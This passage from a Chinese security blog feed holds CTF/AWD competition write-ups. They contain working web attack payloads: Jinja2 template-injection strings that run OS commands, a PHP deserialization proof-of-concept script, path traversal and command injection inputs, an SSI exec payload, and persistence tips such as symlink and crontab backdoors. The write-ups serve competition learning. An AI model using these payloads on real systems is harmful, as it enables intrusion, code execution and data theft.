class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;\\flag&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>执行命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><h3 id="flask日志记录"><a href="#flask日志记录" class="headerlink" title="flask日志记录"></a>flask日志记录</h3><p>flask本身的日志功能并不能满足AWD的需求,就随手写了一个.比赛中是用队里大佬临时写的,赛后重新写了一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">awdlog</span>():</span></span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;/tmp/log.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">    f.writelines(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S\n&#x27;</span>, time.localtime(time.time())))</span><br><span class="line">    f.writelines(<span class="string">&quot;&#123;method&#125; &#123;url&#125; \n&quot;</span>.<span class="built_in">format</span>(method=request.method,url=request.url))</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> d,v <span class="keyword">in</span> <span class="built_in">dict</span>(request.headers).items():</span><br><span class="line">        s += <span class="string">&quot;%s: %s\n&quot;</span>%(d,v)</span><br><span class="line">    f.writelines(s+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> d,v <span class="keyword">in</span> <span class="built_in">dict</span>(request.form).items():</span><br><span class="line">        s += <span class="string">&quot;%s=%s&amp;&quot;</span>%(d,v)</span><br><span class="line">    f.writelines(s.strip(<span class="string">&quot;&amp;&quot;</span>))</span><br><span class="line">    f.writelines(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>因为python这题check比较严格,上了waf一直被checkdown,所以没写waf.不过和php的道理是一样的.</p><p><a href="https://www.xmsec.cc/ogeek-ozero-wp/">https://www.xmsec.cc/ogeek-ozero-wp/</a>)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;(本文首发于先知社区,链接:&lt;a href=&quot;https://xz.aliyun.com/t/6530&quot;&gt;https://xz.aliyun.com/t/6530&lt;/a&gt;)&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;靠着大腿混进决赛.膜ex师傅,膜impakho师傅.&lt;/p&gt;
&lt;p&gt;主办方的权限控制,题目难度之类的都做得非常好.只可惜我太菜了,根本找不到洞,只会划水摸鱼.&lt;/p&gt;
&lt;p&gt;赛制也对我这样的菜鸡非常友好.攻击和防守都可以得分,按结果来看,防守也是大多数队伍的主要得分方式.&lt;/p&gt;
&lt;p&gt;也就是说,只要写一个可以过check的通防waf,就可以拿分.&lt;/p&gt;</summary>
    
    
    
    <category term="CTF&amp;AWD" scheme="https://m09ic.top/categories/CTF-AWD/"/>
    
    
    <category term="Writeup" scheme="https://m09ic.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>北极星杯AWD Writeup</title>
    <link href="https://m09ic.top/posts/16997/"/>
    <id>https://m09ic.top/posts/16997/</id>
    <published>2019-10-04T07:50:57.000Z</published>
    <updated>2021-01-04T14:50:56.735Z</updated>
    
    <content type="html"><![CDATA[<p>(本文首发于星盟安全公众号,链接:<a href="https://weixin.sogou.com/link?url=dn9a_-gY295K0Rci_xozVXfdMkSQTLW6cwJThYulHEtVjXrGTiVgSzeo9_evQk7_5VddawZp5ST5oaiKpHxlmlqXa8Fplpd9X-AYT8efJLqd3HjPvm5Ogi--XpCmp3p1FHUhJwkRV7i9aeBi2KpxK2c3LarU8cDZSknbf5kXQUJ8A8_jCv3vvByWQLSekv36n-__jjNOQ5XtP7ax8jUAmApx0QokVAEdNH4IggvvmKFftm6lykiDTsEdHSGWGQZgpm-K3rnUF_U89kyxDwoXvg..&type=2&query=%E5%8C%97%E6%9E%81%E6%98%9F%E6%9D%AF%20awd&token=80E801B32D15389AEAEC483650AA175EEA3E0B325E8F35FE&k=29&h=V">北极星杯AWD-Web-Writeup</a>)</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>祝祖国70周年生日快乐,也祝星盟一周年生日快乐.感谢各位师傅在国庆假期抽出时间参加这次比赛,也感谢负责组织比赛的师傅忙前忙后.</p><p><strong>大哥大嫂国庆好!!!</strong></p><a id="more"></a><p>先贴上web题目源码:</p><p><a href="https://pan.baidu.com/s/1O-0DDM5CPCh3DtUdAdN3CQ">https://pan.baidu.com/s/1O-0DDM5CPCh3DtUdAdN3CQ</a></p><p><em>因为是先上的waf再做的备份,所以看到waf相关的东西师傅们可以无视…</em></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><h3 id="冰蝎后门"><a href="#冰蝎后门" class="headerlink" title="冰蝎后门"></a>冰蝎后门</h3><p>在<code>/pma</code>路径下有个<code>binxie2.0.1.php</code>与<code>\assets\images\yjh.php</code>,密码是pass.</p><p>但是因为冰蝎马有个交换aes秘钥,并且流量都通过aes加密,之前没写过冰蝎的批量脚本.并且木马设置的太明显,大部分队伍很快就能发现.因此,除了最开始手动提交了几个,这个后门我们并没有用上.</p><p>实际上,到了比赛中后期,还有四五支队伍没有清理这个后门.</p><p>修复方案:</p><p>删除后门文件</p><h3 id="eval后门"><a href="#eval后门" class="headerlink" title="eval后门"></a>eval后门</h3><p>位于<code>\assets\scripts\pass.php</code></p><p><code>@eval($_POST[&#39;pass&#39;]);</code></p><p>太明显了,直接批量脚本跑就完事了.</p><p>修复方案: 删除后门文件</p><h3 id="登录处sql注入"><a href="#登录处sql注入" class="headerlink" title="登录处sql注入"></a>登录处sql注入</h3><p>可用万能密码直接登录,也可以直接使用sqlmap.</p><p><code>sqlhelper.php</code>目录下可以看到配置文件,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private static $host&#x3D;&quot;127.0.0.1&quot;;</span><br><span class="line">private static $user&#x3D;&quot;root&quot;;</span><br><span class="line">private static $pwd&#x3D;&quot;root&quot;;</span><br><span class="line">private static $db&#x3D;&quot;mail&quot;;</span><br></pre></td></tr></table></figure><p>数据库dba是root权限,有可能被利用来提权或读文件.</p><p>因为找到了更容易利用的点,忘了这个sql注入,所以并没有用上这个点.</p><p>修复方案:</p><p>转义或过滤单引号</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>位于<code>sqlhelper.php</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$male</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$a</span>(<span class="keyword">$this</span>-&gt;male);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"><span class="comment">#url = &quot;http://39.100.119.37:1%s80/sqlhelper.php?x=system(&#x27;cat+/flag&#x27;);&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&quot;un&quot;</span>:<span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:4:&quot;male&quot;;s:16:&quot;eval($_GET[&quot;x&quot;])&quot;;&#125;&#x27;</span>&#125;</span><br><span class="line">    flag = requests.post(url,data=data).text</span><br><span class="line">    flag = re.<span class="built_in">compile</span>(<span class="string">&#x27;flag&#123;.+?&#125;&#x27;</span>).findall(flag)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure><p>get请求:</p><p>虽然我们很早就发现了这个点,但是没有在第一时间写出payload,靠着不知道拿队大佬打过来的流量,实现的反打.</p><p>修复方案:</p><p>删除<code>unserialize($_POST[&#39;un&#39;]);</code>即可</p><p>web1我们队只发现了上诉漏洞,流量记录中也没有其他可疑记录,如果师傅们有其他漏洞,欢迎交流</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h3 id="冰蝎后门-1"><a href="#冰蝎后门-1" class="headerlink" title="冰蝎后门"></a>冰蝎后门</h3><p>位于<code>\icon\pww.php</code>与<code>pass.php</code></p><p>利用与修复同web1</p><h3 id="eval后门-1"><a href="#eval后门-1" class="headerlink" title="eval后门"></a>eval后门</h3><p>在<code>.\login\index.php</code>文件57行存在eval后门</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nono&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>靠着手速抢先留其他后门,制作软连接后门,<code>ln -s /flag /var/www/html/.config.php</code>,不少队一直没发现,利用到了最后.</p><p>修复方案:</p><p>删除即可.</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>漏洞位于<code>img.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="variable">$img</span> = file_get_contents(<span class="string">&#x27;images/icon/&#x27;</span>.<span class="variable">$file</span>);</span><br><span class="line"><span class="comment">//使用图片头输出浏览器</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg;text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><p>可以看到<code>file_get_contents</code>函数没有任何过滤,用requests或burpsuite发包读取flag.</p><p>payload:<code>http://39.100.119.37:2%s80/img.php?img=../../../../../flag</code></p><p>修复方案: </p><p>写死$file参数, checkdown也不会检查图片显示正不正确.</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>位于<code>\connect.php</code>,82行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;check&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$check</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;check&#x27;</span>];</span><br><span class="line">    <span class="variable">$id</span> = intval(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT host,port from host where id = <span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$helper</span>-&gt;execute_dql(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;fetch_assoc();</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$row</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$port</span> = <span class="variable">$row</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check</span>==<span class="string">&#x27;web&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$location</span> = <span class="variable">$host</span>.<span class="string">&#x27;:&#x27;</span>.<span class="variable">$port</span>; <span class="comment">// Get the URL from the user.</span></span><br><span class="line">        <span class="variable">$curl</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$location</span>); <span class="comment">// Not validating the input. Trusting the location variable</span></span><br><span class="line">        curl_setopt(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$res_web</span> = curl_exec(<span class="variable">$curl</span>);</span><br><span class="line">        curl_close(<span class="variable">$curl</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$check</span> == <span class="string">&#x27;net&#x27;</span>) &#123;</span><br><span class="line"><span class="variable">$r</span> = exec(<span class="string">&quot;ping -c 1 <span class="subst">$host</span>&quot;</span>);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到GET提交$check参数为”net”,再POST提交host参数即可实现命令注入.</p><p>payload:<code>;cat /flag&gt;/var/www/html/.config.php</code></p><p>web2只发现了这几个漏洞,不过可以肯定存在其他漏洞,在比赛中后期,我们被频繁拿分,但后面有些手忙脚乱没有仔细翻流量.没有实现反打.</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="命令注入-1"><a href="#命令注入-1" class="headerlink" title="命令注入"></a>命令注入</h3><p>位于<code>export.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    exec(<span class="string">&quot;tar -cf backup/<span class="subst">$name</span> images/*.jpg&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=\&quot;alert alert-success\&quot; role=\&quot;alert\&quot;&gt;</span></span><br><span class="line"><span class="string">    导出成功,&lt;a href=&#x27;backup/<span class="subst">$name</span>&#x27;&gt;点击下载&lt;/a&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有任何过滤,$name参数可控,导致命令注入.</p><p>payload: post name参数提交:<code>1.tar  /fla*;</code></p><p>然后访问<code>site.com/backup/1.tar</code></p><p>因为有其他队师傅在批量跑.因此我们就干脆搭顺风车,下载1.tar提交一下.</p><p>修复方案:</p><p>把name参数写死.</p><h3 id="extract后门"><a href="#extract后门" class="headerlink" title="extract后门"></a>extract后门</h3><p>位于<code>\include\config.php</code>与<code>\app\includes\config.php</code>两处,一模一样的后门</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">extract(<span class="variable">$_REQUEST</span>);</span><br><span class="line">@<span class="variable">$d</span>(<span class="variable">$_POST</span>[c]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload: post提交<code>d=assert&amp;c=phpinfo()</code></p><p>修复方案:</p><p>删除这两个文件.</p><p>web3应该也还有其他漏洞,很可惜没有审计出来.</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很幸运拿到第二名,感谢送的奖品^ ^</p><p>总得来说,这次比赛漏洞设置的都比较明显,大部分通过d盾都可以扫出来,流量特征也很明显.</p><p>流量审计在题目难度不高的AWD比赛中效果非常显著.能够快速将抓到的payload转化为自动脚本反击,也可以抓不死马的密码搭乘顺风车.</p><p>在check机制并不是特别严格的情况下,可以上通防waf,阻断请求或返回flag.如果check机制比较严格,可以替换恶意关键字,不阻断请求.如果没做nat,可以找check机ip设置白名单.</p><p>至于其他权限维持的方法,比如软链接,crontab后门,反弹shell,sh后门.尽量把能用的方法都用上.</p><p>如果比赛题目的难度不是特别高,通常可以用d盾扫几个主办方预留的后门,只要手速够快,就可以再其他队伍删除后门之前留下各种后门,可以稳住前期优势,这次比赛我们队就在前期通过主办方后门稳居前三.</p><p>中后期,自动化脚本在批量利用web123以及pwn2.只可惜权限维持没做好,最后时刻被反超了.</p><p>最后膜一下腹黑师傅的W&amp;M战队,最后几轮直接火箭升天,从落后四五百分到领先将近2000分,太强了,强到让我一度怀疑日穿了平台.</p><p>也要膜一下小远师傅的黑科技,</p><p><img src="1.png" alt="1"></p><p>在比赛前准备一个自动备份,上waf,恢复网站的脚本是很有必要的.</p><p>也需要一个提交flag,自动化攻击的框架. 推荐一下王一航师傅的 <code>ReverseShellManager</code>,根据自己需求修改后使用,效果还不错.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;(本文首发于星盟安全公众号,链接:&lt;a href=&quot;https://weixin.sogou.com/link?url=dn9a_-gY295K0Rci_xozVXfdMkSQTLW6cwJThYulHEtVjXrGTiVgSzeo9_evQk7_5VddawZp5ST5oaiKpHxlmlqXa8Fplpd9X-AYT8efJLqd3HjPvm5Ogi--XpCmp3p1FHUhJwkRV7i9aeBi2KpxK2c3LarU8cDZSknbf5kXQUJ8A8_jCv3vvByWQLSekv36n-__jjNOQ5XtP7ax8jUAmApx0QokVAEdNH4IggvvmKFftm6lykiDTsEdHSGWGQZgpm-K3rnUF_U89kyxDwoXvg..&amp;type=2&amp;query=%E5%8C%97%E6%9E%81%E6%98%9F%E6%9D%AF%20awd&amp;token=80E801B32D15389AEAEC483650AA175EEA3E0B325E8F35FE&amp;k=29&amp;h=V&quot;&gt;北极星杯AWD-Web-Writeup&lt;/a&gt;)&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;祝祖国70周年生日快乐,也祝星盟一周年生日快乐.感谢各位师傅在国庆假期抽出时间参加这次比赛,也感谢负责组织比赛的师傅忙前忙后.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;大哥大嫂国庆好!!!&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="网络安全" scheme="https://m09ic.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Writeup" scheme="https://m09ic.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>浙江CTF(ZJCTF) Quals Writeup</title>
    <link href="https://m09ic.top/posts/50801/"/>
    <id>https://m09ic.top/posts/50801/</id>
    <published>2019-09-12T09:08:51.000Z</published>
    <updated>2021-01-04T14:51:54.805Z</updated>
    
    <content type="html"><![CDATA[<p><em>本文原发于sec圈 : <a href="https://www.secquan.org/Discuss/1070283">https://www.secquan.org/Discuss/1070283</a> ,博客转自本人仅做备份用途</em></p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="签到题略"><a href="#签到题略" class="headerlink" title="签到题略"></a>签到题略</h3><h3 id="黑白分明"><a href="#黑白分明" class="headerlink" title="黑白分明"></a>黑白分明</h3><p><img src="1.png" alt="1568279431617"></p><p>一个js写的游戏,成绩要求600000分以上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">view = <span class="function"><span class="keyword">function</span> (<span class="params">score, token</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Too young to simple</span></span><br><span class="line">    <span class="keyword">if</span> (score &lt; <span class="number">600000</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello kitty&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Quickly tell me, I`m thirsty to death.</span></span><br><span class="line">    <span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    <span class="keyword">var</span> url = <span class="string">&quot;/game/push&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> params = <span class="string">&quot;token=&quot;</span> + token;</span><br><span class="line">    http.open(<span class="string">&quot;post&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Send the proper header information along with the request</span></span><br><span class="line">    http.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">    http.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(http.readyState == <span class="number">4</span> &amp;&amp; http.status == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// Tell u the f-l-a-g...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    http.send(params);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抓包提交就完事了,然后就有个天坑.因为有反作弊机制</p><p><img src="2.jpg" alt="1568279431617"></p><p>换多几台电脑,用多几个浏览器,就成功了.</p><p>毒瘤!</p><h3 id="内容包含"><a href="#内容包含" class="headerlink" title="内容包含"></a>内容包含</h3><p>又是包含,又是给临时文件,还以为通过session进行文件包含</p><p><img src="3.png" alt="1568279431617"></p><p>试了半天,没找到包含的攻击点.</p><p>经过学弟提示,发现shtml存在ssi注入.</p><p><a href="https://www.secpulse.com/archives/66934.html">https://www.secpulse.com/archives/66934.html</a></p><p>没有任何过滤.</p><p><code>&lt;!--#exec cmd=&quot;cat ../flag&quot; --&gt;</code></p><p>成功getflag</p><p><img src="4.png" alt="1568279431617"></p><h3 id="大宽碗面"><a href="#大宽碗面" class="headerlink" title="大宽碗面"></a>大宽碗面</h3><p>给了一个输入框,过滤了单引号,如果不是其他什么骚操作,就是宽字节注入了.</p><p><img src="6.png" alt="1568279431617"></p><p>需要提一下,如果只输入单引号,虽然会有不同的返回值,但实际上并没有过滤,语句还是执行了.</p><p>常规操作来说是爆库名表名,但是select from被过滤了.</p><p>接下来就是一通各种各样的绕过技巧的尝试.但是又不支持堆叠查询,很多可以不用select的注入姿势用不了,比如<code>SET</code> 定义语句再<code>EXECUTE</code>执行,或<code>SHOW column from tables</code>都不能使用.</p><p>陷入僵局.</p><p>第二天学弟给我发了张图.</p><p><img src="7.png" alt="1568279431617"></p><p>我测试了下,这样也可以</p><p><img src="8.png" alt="1568279431617"></p><p>猜测,该waf是外挂在代码之外的,有检测参数上限,并且以<code>&amp;</code>为分隔符.</p><p>当<code>&amp;</code>超过100时,多于的参数就直接传入.</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h4 id="非黑即白"><a href="#非黑即白" class="headerlink" title="非黑即白"></a>非黑即白</h4><p>xor加密,老套路,护网被2018有类似原题fez.</p><p>核心加密函数如下,<code>gen_keys</code>是固定的:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zjctf_encrypt</span>(<span class="params">gen_keys, hahahah</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    d1 = hahahah[:<span class="number">8</span>]</span><br><span class="line">    d2 = hahahah[<span class="number">8</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> gen_keys:</span><br><span class="line">        d1 = xor(xor(HASH(d2), i), d1)</span><br><span class="line">        print(<span class="string">&#x27;d1:&#x27;</span>+d1.encode(<span class="string">&#x27;hex&#x27;</span>),<span class="string">&#x27;d2:&#x27;</span>+d2.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        d1, d2 = d2, d1</span><br><span class="line">    <span class="keyword">return</span> d2 + d1</span><br></pre></td></tr></table></figure><p><img src="5.png" alt="1568279431617"></p><p>可以发现有规律.最后一次<code>HASH(d2)</code>和i是已知的,<code>a=a^b^a</code></p><p>因此,可以一次次倒推flag,解密代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>():</span></span><br><span class="line">    keys = [<span class="string">&#x27;w\xed\xe5wJ\xb1B\x87&#x27;</span>, <span class="string">&#x27;G\xb8:\xaa\xf7f\xcd\xe9&#x27;</span>, <span class="string">&#x27;\xa2\xdd=\x01\xfe\xba\x12\xdb&#x27;</span>, <span class="string">&#x27;j[\xdb\x16\xf5\x7ft\xa2&#x27;</span>, <span class="string">&#x27;\xe7x$\xda\xde\xf1\xfd\x05&#x27;</span>, <span class="string">&#x27;\xf3\xf1O\x837\xc0~\xea&#x27;</span>, <span class="string">&#x27;&quot;\xa9\xf7Y\t&#125;R:&#x27;</span>, <span class="string">&#x27;G\x87\xcb\xa9Z%\xda\xd2&#x27;</span>, <span class="string">&#x27;\xef\x8c\xaa\x95\x16u\xbf6&#x27;</span>, <span class="string">&#x27;\xa8\xe3C\x0b1\xdd\x90\x95&#x27;</span>, <span class="string">&#x27;\xacZ\x10\xdeD\x8c\xa0\x0c&#x27;</span>, <span class="string">&#x27;\x88K\xa8\xd4\x95\xf1|\xec&#x27;</span>, <span class="string">&#x27;\x97\xbe&lt;\xd2F\xc2\xceh&#x27;</span>, <span class="string">&#x27;\xa9\x8b\x88\x03\x83!k\x02&#x27;</span>, <span 